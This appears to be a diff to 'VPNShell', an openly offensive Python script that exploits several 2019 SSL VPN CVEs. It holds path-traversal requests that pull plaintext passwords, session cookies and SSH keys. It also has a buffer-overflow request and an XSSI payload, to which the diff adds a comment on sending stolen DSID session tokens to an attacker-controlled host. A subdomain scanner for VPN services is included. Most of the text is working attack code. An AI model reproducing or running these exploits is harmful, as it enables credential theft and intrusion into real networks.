@@ -23,7 +23,7 @@ white = '\033[1;m'
 blue = '\033[1;34m'
 green = '\033[1;32m'
 if sys.platform == 'win32':
-    white = red = white = blue = green = ''
+    red = white = blue = green = ''
 
 
 
@@ -36,7 +36,7 @@ banner = '''%s
 %s''' % (blue, white)
 
 
-parser = argparse.ArgumentParser(description='VPNShell 1.0: Pwn shell from SSL VPN service (portal)')
+parser = argparse.ArgumentParser(description='VPNShell 1.0: Pwn everything from SSL VPN service (portal)')
 parser.add_argument('-s', help='local sorce address (or domain)', dest='host', default='')
 parser.add_argument('-p', help='local port number (default: 443)', dest='port', default='')
 parser.add_argument('-n', help='scan the SSL VPN service', dest='scn', action='store_true')
@@ -85,7 +85,6 @@ def cve_2019_1579(host, port):
     if not sign in wh and len(wh) < 50:
         print('Pwned shell from %s to %s' % (host, socket.gethostbyname()))
         print('')
-        print('    - - - - - - - - -')
     else:
         print('The host %s is not vulnerable to CVE-2019-1579' % host)
 
@@ -198,19 +197,25 @@ def cve_2019_11510(host, port):
     if 'root' in r:
 	print('Extracted the server database from %s' % host)
 	print('')
+	
 	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' % (host, port)
 	r = requests.get(url, verify=False).text
+	
 	if len(r) > 5:
 	    print('Plaintext usernames and password:')
 	    for l in r.split('\n'):
 		print(' - ' + l)
 	else:
 	    print('Plaintext usernames and password: Not found')
+	
 	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/' % (host, port)
 	r = requests.get(url, verify=False).text.replace('\n', '')
+	
 	print('Session cookies (sessionids): DSID=%s' % r)
 	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../.ssh/authorized_keys?/dana/html5acc/guacamole/' % (host, port)
-        ssh = requests.get(url, verify=False).text
+        
+	ssh = requests.get(url, verify=False).text
+	
 	if len(ssh) > 50:
 	    print('  SSH PRIVATE RSA KEYS')
     	    print('')
@@ -230,7 +235,7 @@ def cve_2019_11510(host, port):
 
 		  
 def cve_2019_11542(host, port):
-    url = 'https://%s%s/dana-admin/auth/hc.cgi?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&policyid=0' % (host, port)
+    url = 'https://%s%s/dana-admin/auth/hc.cgi?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&policyid=0' % (host, port)
     r = requests.get(url, verify=False)
     print('Stack buffer overflowed the host %s' % host)
 		  
@@ -245,7 +250,9 @@ def cve_2019_11540(host, port):
         }
         ReplaceContent()
     }
-</script>''' % (host, port)
+</script>
+// DSID can also be used as the CSRF Token
+// Change from `alert(msg)` to `document.replace("https://YOUR_HOST/?DSID="+msg)` if you want to exploit''' % (host, port)
     print('Got the XSSI script payload for %s:' % host)
     print('  - - - - - - - - - -%s' % red)
     print(payload)
@@ -258,7 +265,7 @@ def scan(host):
     for sub in vpnsub:
         url = 'https://%s.%s' % (sub, host)
         try:
-            r = requests.get(url, verify=False, timeout=3)
+            r = requests.get(url, verify=False, timeout=2.2)
             print('Found a SSL VPN service: %s%s%s' % (red, url.replace('https://', ''), white))
             found = True
         except:
